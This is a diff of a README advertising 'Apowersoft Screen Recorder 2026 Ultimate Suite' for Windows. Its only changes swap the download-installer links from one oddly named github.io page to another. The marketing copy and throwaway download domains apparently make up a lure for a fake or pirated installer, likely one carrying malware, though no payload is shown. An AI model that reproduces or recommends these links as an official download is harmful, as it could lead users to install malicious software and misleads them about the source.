@@ -2,7 +2,7 @@
 
 Apowersoft Screen Recorder 2026 Ultimate Suite is a state-of-the-art software solution tailored for Windows users who demand excellence in screen recording and video editing. Whether you are a content creator, educator, or business professional, this suite provides all the tools necessary to capture high-definition screen footage, edit videos with precision, and share your creations effortlessly. With its user-friendly interface and robust features, Apowersoft Screen Recorder 2026 Ultimate Suite stands out as the premier choice for all your recording needs in 2026.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Features
 
@@ -67,7 +67,7 @@ Apowersoft Screen Recorder includes an automatic update feature. You can also ma
 
 For the most recent version of Apowersoft Screen Recorder 2026 Ultimate Suite, please refer to our official download page. The page provides the latest installer and additional resources.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 *Last Updated: 2026*
 
